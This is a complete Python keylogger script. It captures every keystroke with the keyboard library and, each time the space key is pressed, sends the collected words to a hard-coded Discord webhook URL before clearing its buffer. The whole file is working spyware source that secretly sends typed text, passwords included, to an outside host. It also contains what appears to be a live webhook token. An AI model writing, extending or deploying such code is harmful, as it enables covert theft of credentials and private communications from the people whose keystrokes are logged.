import keyboard
from discord_webhook import DiscordWebhook


data = ''
webhook_url = 'https://discord.com/api/webhooks/1217194806577463396/GjkHlq6QpW7FhwqtSmsMP6yqeesyYlLgTfHprbq8C_fAgQ37WcnLmMP28a8GIrAQ2IAw'

while True:
            try:  
                event = keyboard.read_event()
                if event.name == 'space':
                    webhook = DiscordWebhook(url=webhook_url, content=data)
                    response = webhook.execute()
                    data = ''
                    
                elif event.name == 'esc':
                    
                    break
                elif event.name not in ['verr.maj', 'maj']:
                    data += event.name
                
            except KeyboardInterrupt:
            
                break
            except:
                
                break